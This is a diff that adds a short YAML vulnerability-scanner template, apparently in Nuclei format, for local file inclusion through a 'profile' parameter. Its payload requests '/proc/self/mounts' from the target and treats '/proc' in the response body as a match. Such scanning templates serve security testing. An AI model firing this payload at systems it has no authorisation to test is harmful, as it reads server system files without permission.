@@ -1,0 +1,20 @@
+id: lfi6-0050
+name: 'Traversal in profile'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via profile'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      profile:
+        - '/proc/self/mounts'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/proc'
